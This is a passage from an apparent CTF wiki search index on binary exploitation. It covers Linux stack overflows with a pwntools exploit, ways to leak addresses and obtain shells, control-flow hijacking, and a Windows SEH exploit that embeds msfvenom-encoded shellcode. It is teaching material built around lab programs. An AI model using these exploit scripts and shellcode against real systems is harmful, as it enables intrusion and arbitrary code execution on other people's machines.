enabled, you need to enable ASLR to actually disturb the base address. Otherwise, the program will still load a fixed base address (but not the base address of No PIE). We can control the ASLR startup by modifying /proc/sys/kernel/randomize_va_space . The specific options are 0, close ASLR, no randomization. The base addresses of the stack, heap, and .so are the same every time. 1, ordinary ASLR. The stack base address, the mmap base address, and the .so load base address are all randomized, but the heap base address is not randomized. 2, Enhanced ASLR, based on 1, adds randomization of the heap base address. We can use the echo 0 &gt; /proc/sys/kernel/randomize_va_space to turn off the ASLR of the Linux system. Similarly, you can configure the corresponding parameters. In order to reduce the complexity of subsequent exploits, we close ASLR here and close PIE at compile time. Of course, readers can also try different combinations of ASLR and PIE switches, and use IDA and its dynamic debugging function to observe the program address change (can also be successfully attacked when ASLR is closed and PIE is enabled). After confirming that the stack overflow and PIE protection are turned off, we use IDA to decompile the binary and view the vulnerable function. can be seen int vulnerable () { char s ; // [sp+4h] [bp-14h]@1 gets ( & s ); return puts ( & s ); } The length of the string distance ebp is 0x14, then the corresponding stack structure is +-----------------+ | retaddr | +-----------------+ | saved ebp | ebp--->+-----------------+ | | | | | | | | | | | | s,ebp-0x14-->+-----------------+ And, we can get the address of success through IDA, its address is 0x0804843B. ` asm .text:0804843B success proc near .text:0804843B push ebp .text:0804843C mov ebp, esp .text:0804843E sub esp, 8 .text:08048441 sub esp, 0Ch .text:08048444 push offset s ; \"You Hava already controlled it.\" .text:08048449 call _puts .text:0804844E add esp, 10h .text: 08048451 .text:08048452 leave .text: 08048453 retn .text:08048453 success endp Then if we read the string is 0x14*'a'+'bbbb'+success_addr Then, since gets will read the carriage return, we can directly read all the strings, and cover the saved ebp to bbbb and the retaddr to success_addr. That is, the stack structure at this time is ```text +-----------------+ | 0x0804843B | +-----------------+ | . \\ t ebp--->+-----------------+ | | | | | | | | | | | | s,ebp-0x14-->+-----------------+ However, it should be noted that since in the computer's memory, each value is stored in bytes. In general, small-end storage is used, that is, the form of 0x0804843B in memory is \\x3b\\x84\\x04\\x08 However, we can't input these characters directly in the terminal. When the terminal inputs, \\, x, etc. also count as a single character. . So we need to find a way to enter \\x3b as a character. So at this point we need to use a wave of pwntools (about how to install and basic usage, please github), here the code using pwntools is as follows: ##coding=utf8 from pwn import * ## Constructing objects that interact with the program sh = process ( './stack_example' ) success_addr = 0x0804843b ## Constructing a payload payload = 'a' * 0x14 + 'bbbb' + p32 ( success_addr ) print p32 ( success_addr ) ## Send a string to the program sh . sendline ( payload ) ## Convert code interaction to manual interaction sh . interactive () Execute a wave of code to get \u279c stack-example python exp.py [ + ] Starting local process './stack_example' : pid 61936 x84 [ * ] Switching to interactive mode aaaaaaaaaaaaaaaaaaaabbbb ; \\ x84 \\ x0 You Hava already controlled it. [ * ] Got EOF while reading in interactive $ [ * ] Process './stack_example' stopped with exit code -11 ( SIGSEGV ) ( pid 61936 ) [ * ] Got EOF while sending in interactive You can see that we have indeed executed the success function.","title":"Basic example"},{"location":"pwn/linux/stackoverflow/stackoverflow-basic/#_1","text":"The above example actually shows the more important steps in the stack overflow.","title":"\u5c0f\u8ff0"},{"location":"pwn/linux/stackoverflow/stackoverflow-basic/#looking-for-dangerous-functions","text":"By looking for dangerous functions, we quickly determine if the program is likely to have a stack overflow and, if so, where the stack overflows. Common dangerous functions are as follows Enter gets, read a line directly, ignoring '\\x00' scanf vscanf output sprintf string strcpy, string copy, encountered '\\x00' stop strcat, string splicing, encountered '\\x00' stop bcopy","title":"Looking for dangerous functions"},{"location":"pwn/linux/stackoverflow/stackoverflow-basic/#determine-the-fill-length","text":"This part is mainly to calculate the distance between the address we want to operate and the address we want to cover**. A common method of operation is to turn on IDA and calculate the offset based on its given address. General variables will have the following index modes The index relative to the stack base address can be obtained directly by looking at the EBP relative offset The index corresponding to the top pointer of the stack generally needs to be debugged, and then it will be converted to the first type. Direct address indexing is equivalent to directly giving an address. In general, we will have the following coverage requirements Override function return address , this time just look at EBP directly. Overwrites the contents of a variable on the stack , which requires more detailed calculations. Overwrites the contents of a variable in the bss section . Overwrite the contents of a specific variable or address based on actual implementation. The reason we want to cover an address is because we want to control the program execution flow directly or indirectly by overriding the address**.","title":"Determine the fill length"},{"location":"pwn/linux/stackoverflow/stackoverflow-basic/#reference-reading","text":"stack buffer overflow http://bobao.360.cn/learning/detail/3694.html https://www.cnblogs.com/rec0rd/p/7646857.html","title":"Reference reading"},{"location":"pwn/linux/summary/get-address/","text":"Get address \u00b6 In the process of exploiting, we often need to get some variables, the address of the function, so that it can be further utilized. Here I will divide the methods for obtaining addresses into the following categories. Find the address directly, that is, we can directly see the address of the corresponding symbol by means of decompilation. Leak address, which requires us to leak the contents of some symbol pointers in the program by controlling the execution flow of the program to obtain the corresponding address. Speculative address, which we generally use here is based on the offset between the symbols in a segment is fixed, in order to infer the address of some new symbols. Guess the address, generally speaking, we need to guess the address of the corresponding symbol, which is often accompanied by violent enumeration. The above methods are a kind of progressive consideration. We should maintain this way of thinking when obtaining the address of the relevant symbol. In the above several ways, I think there are two main core ideas. Take full advantage of the nature of the code itself, such as the location of some code in the program is fixed, such as the location of the code segment when PIE is not turned on; for example, the last three bits of glibc are fixed. Take advantage of the nature of relative offsets. This is due to the fact that the memory that is currently loaded during program loading is a segment, so the relative offset is often fixed. More specific, we can look at the following introduction. Directly looking for an address \u00b6 The address of the relevant variable or function has been given in the program. At this time, we can use it directly. This situation often applies when the program does not open PIE. Leak address \u00b6 In the process of leaking addresses, we often need to find sensitive pointers that store either the address of the symbol we want or the address of the symbol we want. Here are a few examples. Leaking variable pointer \u00b6 such as Leaking the header table pointers of various bins in the main arena, you may be able to get the address of a variable in the heap or glibc. leaking got table \u00b6 Sometimes we don't have to know the address of a function directly. We can use the GOT table to jump to the address of the corresponding function. Of course, if we have to know the address of this function, we can use the output function such as write, puts and so on to output the corresponding content in the address of the GOT table (** premise that this function has been parsed once). ret2dl-resolve \u00b6 When the ELF file is dynamically linked, the got table uses the delay binding technique. When the libc function is called for the first time, the program calls the _dl_runtime_resolve function to resolve its address. Therefore, we can use the stack overflow to construct the ROP chain and forge the parsing of other functions (such as: system). This is also the technique we introduced in the advanced rop. /proc/self/maps \u00b6 We can consider getting the base address associated with the program by reading the program's /proc/self/maps . Speculative address \u00b6 In most cases, we can't directly get the address of the desired function, and often need to make some address speculation. As mentioned above, the emphasis here is on the idea that the offset between symbols is fixed. Stack Related \u00b6 Regarding the address on the stack, in fact, most of the time we do not need a specific stack address, but we can guess the position of a variable on the stack relative to the EBP according to the addressing mode of the stack. Glibc Related \u00b6 The main consideration here is how to find related functions in Glibc. With libc \u00b6 At this time we need to consider using the same function as the base address of the function in libc. For example, we can leak the base address of libc in memory by the address of __libc_start_main. Note: Do not select a function with wapper, which will make the base address of the function incorrectly calculated. What are the common wapper functions? (To be added). Without libc \u00b6 In fact, the solution strategy for this situation is divided into two types. Find a way to get libc Find a way to get the corresponding address directly. For the address that we want to leak, we simply need the corresponding content, so puts, write, printf can be. puts, printf will have \\x00 truncation problem write can specify the length of the output. Here are some corresponding methods pwnlib.dynelf \u00b6 The premise is that we can divulge the contents of any address. If you want to use the write function to leak, it is better to output some address content at a time, because we generally just continuously read the content to the high address, it is likely to cause the high address environment variable to be overwritten, which will lead to the shell. Can not start. libc database \u00b6 #Update database ./get # Add existing libc to the database ./add libc.so # Find all the libc's in the database that have the given names at the given addresses. ./find function1 addr function2 addr # Dump some useful offsets, given a libc ID. You can also provide your own names to dump. ./dump __libc_start_main_ret system dup2 Go to the libc database and find the corresponding libc with the same address that already appears. This is probably the same. You can also use the following online website: [libcdb.com] ( http://libcdb.com ) libc.blukat.me Of course, there are also https://github.com/lieanu/LibcSearcher mentioned above. Heap related \u00b6 Regarding the speculation of some addresses of the heap, this requires us to know in more detail how much memory is allocated in the heap, which block of the memory address is currently leaked, and then obtain the base address of the heap, and the relevant memory address in the heap. Guess the address \u00b6 In some strange cases, we may be able to use the following Use some violent methods to get the address, such as 32-bit, the address randomization space is relatively small. When a program is specially deployed, the location where its different libraries are loaded may be special. We can try it locally and guess the situation at the remote.","title":"Address Leaking"},{"location":"pwn/linux/summary/get-address/#get-address","text":"In the process of exploiting, we often need to get some variables, the address of the function, so that it can be further utilized. Here I will divide the methods for obtaining addresses into the following categories. Find the address directly, that is, we can directly see the address of the corresponding symbol by means of decompilation. Leak address, which requires us to leak the contents of some symbol pointers in the program by controlling the execution flow of the program to obtain the corresponding address. Speculative address, which we generally use here is based on the offset between the symbols in a segment is fixed, in order to infer the address of some new symbols. Guess the address, generally speaking, we need to guess the address of the corresponding symbol, which is often accompanied by violent enumeration. The above methods are a kind of progressive consideration. We should maintain this way of thinking when obtaining the address of the relevant symbol. In the above several ways, I think there are two main core ideas. Take full advantage of the nature of the code itself, such as the location of some code in the program is fixed, such as the location of the code segment when PIE is not turned on; for example, the last three bits of glibc are fixed. Take advantage of the nature of relative offsets. This is due to the fact that the memory that is currently loaded during program loading is a segment, so the relative offset is often fixed. More specific, we can look at the following introduction.","title":"Get address"},{"location":"pwn/linux/summary/get-address/#directly-looking-for-an-address","text":"The address of the relevant variable or function has been given in the program. At this time, we can use it directly. This situation often applies when the program does not open PIE.","title":"Directly looking for an address"},{"location":"pwn/linux/summary/get-address/#leak-address","text":"In the process of leaking addresses, we often need to find sensitive pointers that store either the address of the symbol we want or the address of the symbol we want. Here are a few examples.","title":"Leak address"},{"location":"pwn/linux/summary/get-address/#leaking-variable-pointer","text":"such as Leaking the header table pointers of various bins in the main arena, you may be able to get the address of a variable in the heap or glibc.","title":"Leaking variable pointer"},{"location":"pwn/linux/summary/get-address/#leaking-got-table","text":"Sometimes we don't have to know the address of a function directly. We can use the GOT table to jump to the address of the corresponding function. Of course, if we have to know the address of this function, we can use the output function such as write, puts and so on to output the corresponding content in the address of the GOT table (** premise that this function has been parsed once).","title":"leaking got table"},{"location":"pwn/linux/summary/get-address/#ret2dl-resolve","text":"When the ELF file is dynamically linked, the got table uses the delay binding technique. When the libc function is called for the first time, the program calls the _dl_runtime_resolve function to resolve its address. Therefore, we can use the stack overflow to construct the ROP chain and forge the parsing of other functions (such as: system). This is also the technique we introduced in the advanced rop.","title":"ret2dl-resolve"},{"location":"pwn/linux/summary/get-address/#procselfmaps","text":"We can consider getting the base address associated with the program by reading the program's /proc/self/maps .","title":"/proc/self/maps"},{"location":"pwn/linux/summary/get-address/#speculative-address","text":"In most cases, we can't directly get the address of the desired function, and often need to make some address speculation. As mentioned above, the emphasis here is on the idea that the offset between symbols is fixed.","title":"Speculative address"},{"location":"pwn/linux/summary/get-address/#stack-related","text":"Regarding the address on the stack, in fact, most of the time we do not need a specific stack address, but we can guess the position of a variable on the stack relative to the EBP according to the addressing mode of the stack.","title":"Stack Related"},{"location":"pwn/linux/summary/get-address/#glibc-related","text":"The main consideration here is how to find related functions in Glibc.","title":"Glibc Related"},{"location":"pwn/linux/summary/get-address/#with-libc","text":"At this time we need to consider using the same function as the base address of the function in libc. For example, we can leak the base address of libc in memory by the address of __libc_start_main. Note: Do not select a function with wapper, which will make the base address of the function incorrectly calculated. What are the common wapper functions? (To be added).","title":"With libc"},{"location":"pwn/linux/summary/get-address/#without-libc","text":"In fact, the solution strategy for this situation is divided into two types. Find a way to get libc Find a way to get the corresponding address directly. For the address that we want to leak, we simply need the corresponding content, so puts, write, printf can be. puts, printf will have \\x00 truncation problem write can specify the length of the output. Here are some corresponding methods","title":"Without libc"},{"location":"pwn/linux/summary/get-address/#pwnlibdynelf","text":"The premise is that we can divulge the contents of any address. If you want to use the write function to leak, it is better to output some address content at a time, because we generally just continuously read the content to the high address, it is likely to cause the high address environment variable to be overwritten, which will lead to the shell. Can not start.","title":"pwnlib.dynelf"},{"location":"pwn/linux/summary/get-address/#libc-database","text":"#Update database ./get # Add existing libc to the database ./add libc.so # Find all the libc's in the database that have the given names at the given addresses. ./find function1 addr function2 addr # Dump some useful offsets, given a libc ID. You can also provide your own names to dump. ./dump __libc_start_main_ret system dup2 Go to the libc database and find the corresponding libc with the same address that already appears. This is probably the same. You can also use the following online website: [libcdb.com] ( http://libcdb.com ) libc.blukat.me Of course, there are also https://github.com/lieanu/LibcSearcher mentioned above.","title":"libc database"},{"location":"pwn/linux/summary/get-address/#heap-related","text":"Regarding the speculation of some addresses of the heap, this requires us to know in more detail how much memory is allocated in the heap, which block of the memory address is currently leaked, and then obtain the base address of the heap, and the relevant memory address in the heap.","title":"Heap related"},{"location":"pwn/linux/summary/get-address/#guess-the-address","text":"In some strange cases, we may be able to use the following Use some violent methods to get the address, such as 32-bit, the address randomization space is relatively small. When a program is specially deployed, the location where its different libraries are loaded may be special. We can try it locally and guess the situation at the remote.","title":"Guess the address"},{"location":"pwn/linux/summary/get-shell/","text":"shell Get a summary \u00b6 overview \u00b6 The shell we get is generally in two forms. Directly interactive shell Bind the shell to the specified port of the specified ip Here are a few common ways to get a shell. shellcode \u00b6 When using shellcode to get a shell, the basic requirement is that we can place the shellcode in a writable executable memory area . Therefore, when there is no memory area to write executable, we need to use the function mprotect to set the permissions of the relevant memory. In addition, sometimes the characters in the shellcode must meet certain requirements, such as printable characters, letters, numbers, and so on. system \u00b6 We usually execute functions such as system(\"/bin/sh\"), system('sh'). Here we mainly need to find some addresses, you can refer to the section for obtaining the address. the address of system \"/bin/sh\", \"sh\" address binary is a string inside Consider personal reading the corresponding string libc actually has /bin/sh When you get the shell in system, a very good advantage is that we only need to arrange one parameter. The disadvantage is that when we lay out the parameters, we may not be able to execute because the environment variables are destroyed. execve \u00b6 Execute execve(\"/bin/sh\", NULL, NULL). When using execve to get a shell, the first few are consistent with system. But it has the advantage of being almost immune to environmental variables. But the downside is that we need to arrange three parameters. In addition, we can also use one_gadget to get the shell in glibc. syscall \u00b6 The system call number __NR_execve is 11 in IA-32 and 59 in x86-64. Its advantage is that it is almost immune to environmental variables. However, we need to find a system call command like syscall .","title":"Get Shell"},{"location":"pwn/linux/summary/get-shell/#shell-get-a-summary","text":"","title":"shell Get a summary"},{"location":"pwn/linux/summary/get-shell/#overview","text":"The shell we get is generally in two forms. Directly interactive shell Bind the shell to the specified port of the specified ip Here are a few common ways to get a shell.","title":"overview"},{"location":"pwn/linux/summary/get-shell/#shellcode","text":"When using shellcode to get a shell, the basic requirement is that we can place the shellcode in a writable executable memory area . Therefore, when there is no memory area to write executable, we need to use the function mprotect to set the permissions of the relevant memory. In addition, sometimes the characters in the shellcode must meet certain requirements, such as printable characters, letters, numbers, and so on.","title":"shellcode"},{"location":"pwn/linux/summary/get-shell/#system","text":"We usually execute functions such as system(\"/bin/sh\"), system('sh'). Here we mainly need to find some addresses, you can refer to the section for obtaining the address. the address of system \"/bin/sh\", \"sh\" address binary is a string inside Consider personal reading the corresponding string libc actually has /bin/sh When you get the shell in system, a very good advantage is that we only need to arrange one parameter. The disadvantage is that when we lay out the parameters, we may not be able to execute because the environment variables are destroyed.","title":"system"},{"location":"pwn/linux/summary/get-shell/#execve","text":"Execute execve(\"/bin/sh\", NULL, NULL). When using execve to get a shell, the first few are consistent with system. But it has the advantage of being almost immune to environmental variables. But the downside is that we need to arrange three parameters. In addition, we can also use one_gadget to get the shell in glibc.","title":"execve"},{"location":"pwn/linux/summary/get-shell/#syscall","text":"The system call number __NR_execve is 11 in IA-32 and 59 in x86-64. Its advantage is that it is almost immune to environmental variables. However, we need to find a system call command like syscall .","title":"syscall"},{"location":"pwn/linux/summary/hijack-control-flow/","text":"Control program execution flow \u00b6 In the process of controlling the execution flow of the program, we can consider the following ways. Direct control EIP \u00b6 return address \u00b6 That is, control the return address on the program stack. Jump pointer \u00b6 Here we can consider the following way call jmp function pointer \u00b6 Common function pointers have vtable, function table\uff0c\u5982 IO_FILE \u7684 vtable\uff0cprintf function table\u3002 hook pointers, such as malloc_hook , free_hook . acting Modify control flow related variables \u00b6","title":"Hijack Control Flow"},{"location":"pwn/linux/summary/hijack-control-flow/#control-program-execution-flow","text":"In the process of controlling the execution flow of the program, we can consider the following ways.","title":"Control program execution flow"},{"location":"pwn/linux/summary/hijack-control-flow/#direct-control-eip","text":"","title":"Direct control EIP"},{"location":"pwn/linux/summary/hijack-control-flow/#return-address","text":"That is, control the return address on the program stack.","title":"return address"},{"location":"pwn/linux/summary/hijack-control-flow/#jump-pointer","text":"Here we can consider the following way call jmp","title":"Jump pointer"},{"location":"pwn/linux/summary/hijack-control-flow/#function-pointer","text":"Common function pointers have vtable, function table\uff0c\u5982 IO_FILE \u7684 vtable\uff0cprintf function table\u3002 hook pointers, such as malloc_hook , free_hook . acting","title":"function pointer"},{"location":"pwn/linux/summary/hijack-control-flow/#modify-control-flow-related-variables","text":"","title":"Modify control flow related variables"},{"location":"pwn/windows/readme/","text":"Briefly describe exploits under Windows.","title":"Overview"},{"location":"pwn/windows/stackoverflow/SEH-Exploits/","text":"Instruction \u00b6 \u7ed3\u6784\u5316\u5f02\u5e38\u5904\u7406\uff08SEH\uff09\u662f\u4e00\u79cd Windows \u673a\u5236\uff0c\u7528\u4e8e\u4e00\u81f4\u5730\u5904\u7406\u786c\u4ef6\u548c\u8f6f\u4ef6\u5f02\u5e38\u3002\u8be5\u7ed3\u6784\u901a\u5e38\u8868\u793a\u4e3a try / except\u6216try / catch \u4ee3\u7801\u5757\u3002 __try { // the block of code to try (aka the \"guarded body\") ... } __except ( exception filter ) { // the code to run in the event of an exception (aka the \"exception handler) ... } \u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u53ef\u4ee5\u7531\u5e94\u7528\u7a0b\u5e8f\uff08\u901a\u8fc7\u4e0a\u8ff0 try / except \u6784\u9020\uff09\u6216\u7531\u64cd\u4f5c\u7cfb\u7edf\u672c\u8eab\u5b9e\u73b0\u3002\u7531\u4e8e\u9519\u8bef\u7684\u7c7b\u578b\u5f88\u591a\uff08\u9664\u96f6\uff0c\u8d85\u51fa\u8303\u56f4\u7b49\uff09\uff0c\u56e0\u6b64\u53ef\u4ee5\u6709\u8bb8\u591a\u76f8\u5e94\u7684\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u3002 \u4e0d\u8bba\u5728\u4f55\u5904\u5b9a\u4e49\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff08\u5e94\u7528\u7a0b\u5e8f\u4e0e\u64cd\u4f5c\u7cfb\u7edf\uff09\uff0c\u8fd8\u662f\u8bbe\u8ba1\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u7684\u7c7b\u578b\uff0c\u6240\u6709\u5904\u7406\u7a0b\u5e8f\u5747\u7531 Windows SEH \u901a\u8fc7\u6307\u5b9a\u6570\u636e\u7ed3\u6784\u548c\u51fd\u6570\u7684\u96c6\u5408\u8fdb\u884c\u96c6\u4e2d\u7edf\u4e00\u7ba1\u7406\u3002 SEH\u7684\u4e3b\u8981\u7ec4\u6210\u90e8\u5206 \u00b6 \u5bf9\u4e8e\u6bcf\u4e2a\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff0c\u90fd\u6709\u4e00\u4e2a Exception Registration Record \u7ed3\u6784\uff0c\u5982\u4e0b\u6240\u793a\uff1a typedef struct _EXCEPTION_REGISTRATION_RECORD { struct _EXCEPTION_REGISTRATION_RECORD * Next ; PEXCEPTION_ROUTINE Handler ; } EXCEPTION_REGISTRATION_RECORD , * PEXCEPTION_REGISTRATION_RECORD ; \u8fd9\u4e9b Exception Registration Record \u4f7f\u7528\u94fe\u8868\u7684\u7ed3\u6784\u8fde\u63a5\u5728\u4e00\u8d77 \u3002\u5176\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bb5\uff08 Next\uff09\u662f\u6307\u5411SEH\u94fe\u4e2d\u4e0b\u4e00\u4e2a _EXCEPTION_REGISTRATION_RECORD \u7684\u6307\u9488\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u53ef\u4ee5\u4f7f\u7528 Next \u4ece\u4e0a\u5230\u4e0b\u6d4f\u89c8 SEH \u94fe\u3002\u7b2c\u4e8c\u4e2a\u5b57\u6bb5\uff08Handler\uff09\u662f\u6307\u5411\u5f02\u5e38\u5904\u7406\u51fd\u6570\u7684\u6307\u9488\uff0c\u8be5\u51fd\u6570\u5982\u4e0b\u6240\u793a\uff1a EXCEPTION_DISPOSITION __cdecl _except_handler ( struct _EXCEPTION_RECORD * ExceptionRecord , oid EstablisherFrame , struct _CONTEXT * ContextRecord , void * DispatcherContext ); \u7b2c\u4e00\u4e2a\u51fd\u6570\u53c2\u6570\u662f\u6307\u5411 _EXCEPTION_RECORD \u7ed3\u6784\u7684\u6307\u9488\u3002\u8be5\u7ed3\u6784\u5305\u542b\u6709\u5173\u7ed9\u5b9a\u5f02\u5e38\u7684\u4fe1\u606f\uff0c\u5305\u62ec\u5f02\u5e38\u4ee3\u7801\uff0c\u5f02\u5e38\u5730\u5740\u548c\u53c2\u6570\u6570\u91cf\u3002 _except_handler \u51fd\u6570\u4f7f\u7528\u8fd9\u4e9b\u4fe1\u606f\uff0c\u4ee5\u786e\u5b9a\u5f02\u5e38\u662f\u5426\u53ef\u4ee5\u7531\u5f53\u524d\u5f02\u5e38\u5904\u7406\u51fd\u6570\u5904\u7406\uff0c\u6216\u8005\u5b83\u9700\u8981\u79fb\u4ea4\u5230\u4e0b\u4e00\u4e2a Exception Registration Record \u8fdb\u884c\u5904\u7406\u3002 \u5229\u7528SEH \u00b6 \u5728 SEH \u4e0b\uff0c\u76f4\u63a5\u8986\u76d6 SEH_Handler \u5b57\u6bb5\uff0c\u7136\u540e\u89e6\u53d1\u5f02\u5e38\u540e\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002\u6d4b\u8bd5\u7a0b\u5e8f\u4ee3\u7801\uff08\u4f7f\u7528VS2017\u547d\u4ee4\u884c\u7f16\u8bd1\uff09\uff1a // cl SEH_Chain.c /GS- /DYNAMICBASE:NO /link /FIXED int vul () { char s [ 0x20 ] = { 0 }; __try { scanf ( \"%s\" , s ); } __except ( EXCEPTION_EXECUTE_HANDLER ) { puts ( \"GG\" ); } return 0 ; } int main ( int argc , char ** argv ) { puts ( \"Welcome!\" ); vul (); return 0 ; } \u672a\u4fee\u6539\u7684SEH\u94fe\uff1a \u5730\u5740 \u5f02\u5e38\u5904\u7406\u4f8b\u7a0b \u6a21\u5757/\u6807\u7b7e \u6ce8\u91ca 0019FF60 00401E10 seh_chain 0019FFCC 77A79F80 ntdll 0019FFE4 77A88F07 ntdll \u6808\u7a7a\u95f4\uff1a 0019FF60 0019FFCC \u6307\u5411SEH_Record[1]\u7684\u6307\u9488 0019FF64 00401E10 seh_chain.00401E10 0019FF68 E1C62A0A 0019FF6C 00000000 0019FF70 0019FF80 0019FF74 76036359 \u8fd4\u56de\u5230 kernel32.76036359 \u81ea ??? 0019FF78 00379000 0019FF7C 76036340 kernel32.76036340 0019FF80 0019FFDC 0019FF84 77A67B74 \u8fd4\u56de\u5230 ntdll.77A67B74 \u81ea ??? 0019FF88 00379000 0019FF8C E03A396D 0019FF90 00000000 0019FF94 00000000 0019FF98 00379000 0019FF9C 00000000 0019FFA0 00000000 0019FFA4 00000000 0019FFA8 00000000 0019FFAC 00000000 0019FFB0 00000000 0019FFB4 00000000 0019FFB8 00000000 0019FFBC 00000000 0019FFC0 00000000 0019FFC4 0019FF8C 0019FFC8 00000000 0019FFCC 0019FFE4 \u6307\u5411SEH_Record[2]\u7684\u6307\u9488 0019FFD0 77A79F80 ntdll.77A79F80 \u53ef\u4ee5\u5f88\u6e05\u6670\u7684\u770b\u5230SEH\u94fe\u7684\u5b58\u5728\u3002scanf\u8986\u76d6\u4e4b\u540e\u7684SEH\u94fe\uff1a \u5730\u5740 \u5f02\u5e38\u5904\u7406\u4f8b\u7a0b \u6a21\u5757/\u6807\u7b7e \u6ce8\u91ca 0019FF10 42424242 42424242 00000000 \u5904\u7406\u4f8b\u7a0b\u548c\u4e0b\u4e2aSEH\u7ed3\u6784\u7684\u4f4d\u7f6e\u90fd\u5df2\u7ecf\u88ab\u4fee\u6539\u3002\u5c1d\u8bd5\u8f93\u5165\u5927\u91cf\u6570\u636e\u4ee5\u89e6\u53d1\u5f02\u5e38\uff1a python - c \"print 'A'*0x28 + 'B'*8 + 'A'*0x200\" \u89e6\u53d1\u5f02\u5e38\u540e\u7684\u5bc4\u5b58\u5668\uff1a EAX : 00000000 EBX : 00000000 ECX : 42424242 EDX : 77A88DC0 ntdll.77A88DC0 EBP : 0019F0D8 ESP : 0019F0B8 ESI : 00000000 EDI : 00000000 EIP : 42424242 EFLAGS : 00010246 \u53ef\u4ee5\u770b\u5230\uff0cEIP\u5df2\u7ecf\u88ab\u63a7\u5236\u5230\u4e86\u8f93\u5165\u7684 BBBB(42424242) \u5904\uff0c\u4ece\u800c\u63a7\u5236\u4e86\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002 SEH\u7684\u5e38\u7528\u5229\u7528\u65b9\u5f0f \u00b6 attachment here EIP\u88ab\u63a7\u5236\u540e\u7684\u6808\u7a7a\u95f4\uff1a 0019F0B8 77A88DA2 \u8fd4\u56de\u5230 ntdll.77A88DA2 \u81ea ??? 0019F0BC 0019F1B8 0019F0C0 0019FF10 \"BBBBBBBBAAAAAAAAAAAAAAAAA... \" 0019F0C4 0019F208 0019F0C8 0019F144 &\"BBBBBBBBAAAAAAAAAAAAAAAA... \" 0019F0CC 0019F6FC \u6307\u5411SEH_Record[1]\u7684\u6307\u9488 0019F0D0 77A88DC0 ntdll.77A88DC0 0019F0D4 0019FF10 \"BBBBBBBBAAAAAAAAAAAAAAAAA...\" 0019F0D8 0019F1A0 \u53ef\u4ee5\u770b\u5230 ESP+0x8 \u5904\u7684\u5730\u5740\u6b63\u597d\u6307\u5411\u89e6\u53d1\u5f02\u5e38\u7684 SEH \u7684\u7ed3\u6784\u5904\uff0c\u5f53\u7a0b\u5e8f\u672a\u5f00\u542f DEP \u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7 POP+POP+RET \u7684\u65b9\u5f0f\uff0c\u6267\u884c\u5230 ShellCode \u4e0a\u3002\u5bfb\u627e\u4e00\u4e2a gadget\uff1a\uff08x32dbg ->\u53f3\u51fb->\u641c\u7d22->\u6240\u6709\u6a21\u5757->\u547d\u4ee4\uff0c\u6216\u8005\u5176\u4ed6\u65b9\u6cd5\u5bfb\u627e\uff09 0040292 A | 5 E | pop esi | 0040292 B | 5 B | pop ebx | 0040292 C | C3 | ret | \u7f16\u5199\u4e00\u4e2aEXP\uff1a from pwintools import * import struct def p32 ( addr ): return struct . pack ( \"<I\" , addr ) pop_pop_ret = 0x0040136F p = Process ( \"./SEH_Chain_VC6.exe\" ) # msfvenom -p windows/exec CMD=calc.exe -e x86/shikata_ga_nai -b '\\x09\\x0a\\x0b\\x0c\\x0d\\x1a\\x20' -f python buf = \"\" buf += \" \\xb8\\xb6\\xc7\\xe5\\xf9\\xda\\xdb\\xd9\\x74\\x24\\xf4\\x5d\\x29 \" buf += \" \\xc9\\xb1\\x31\\x83\\xed\\xfc\\x31\\x45\\x0f\\x03\\x45\\xb9\\x25 \" buf += \" \\x10\\x05\\x2d\\x2b\\xdb\\xf6\\xad\\x4c\\x55\\x13\\x9c\\x4c\\x01 \" buf += \" \\x57\\x8e\\x7c\\x41\\x35\\x22\\xf6\\x07\\xae\\xb1\\x7a\\x80\\xc1 \" buf += \" \\x72\\x30\\xf6\\xec\\x83\\x69\\xca\\x6f\\x07\\x70\\x1f\\x50\\x36 \" buf += \" \\xbb\\x52\\x91\\x7f\\xa6\\x9f\\xc3\\x28\\xac\\x32\\xf4\\x5d\\xf8 \" buf += \" \\x8e\\x7f\\x2d\\xec\\x96\\x9c\\xe5\\x0f\\xb6\\x32\\x7e\\x56\\x18 \" buf += \" \\xb4\\x53\\xe2\\x11\\xae\\xb0\\xcf\\xe8\\x45\\x02\\xbb\\xea\\x8f \" buf += \" \\x5b\\x44\\x40\\xee\\x54\\xb7\\x98\\x36\\x52\\x28\\xef\\x4e\\xa1 \" buf += \" \\xd5\\xe8\\x94\\xd8\\x01\\x7c\\x0f\\x7a\\xc1\\x26\\xeb\\x7b\\x06 \" buf += \" \\xb0\\x78\\x77\\xe3\\xb6\\x27\\x9b\\xf2\\x1b\\x5c\\xa7\\x7f\\x9a \" buf += \" \\xb3\\x2e\\x3b\\xb9\\x17\\x6b\\x9f\\xa0\\x0e\\xd1\\x4e\\xdc\\x51 \" buf += \" \\xba\\x2f\\x78\\x19\\x56\\x3b\\xf1\\x40\\x3c\\xba\\x87\\xfe\\x72 \" buf += \" \\xbc\\x97\\x00\\x22\\xd5\\xa6\\x8b\\xad\\xa2\\x36\\x5e\\x8a\\x5d \" buf += \" \\x7d\\xc3\\xba\\xf5\\xd8\\x91\\xff\\x9b\\xda\\x4f\\xc3\\xa5\\x58 \" buf += \" \\x7a\\xbb\\x51\\x40\\x0f\\xbe\\x1e\\xc6\\xe3\\xb2\\x0f\\xa3\\x03 \" buf += \" \\x61\\x2f\\xe6\\x67\\xe4\\xa3\\x6a\\x46\\x83\\x43\\x08\\x96 \" payload = \"\" payload += \" \\x90 \" * 0x28 payload += \" \\xEB\\x14\\x90\\x90 \" # asm(\"jmp $+22\") payload += p32 ( pop_pop_ret ) payload += \" \\x90 \" * 0x20 payload += buf payload = payload . ljust ( 0x200 , \" \\x90 \" ) raw_input () p . sendline ( payload ) raw_input () \u6267\u884cexp\u540e\uff0c\u5c06\u4f1a\u5f39\u51fa\u4e00\u4e2a\u8ba1\u7b97\u5668\u3002","title":"SEH Exploits"},{"location":"pwn/windows/stackoverflow/SEH-Exploits/#instruction","text":"\u7ed3\u6784\u5316\u5f02\u5e38\u5904\u7406\uff08SEH\uff09\u662f\u4e00\u79cd Windows 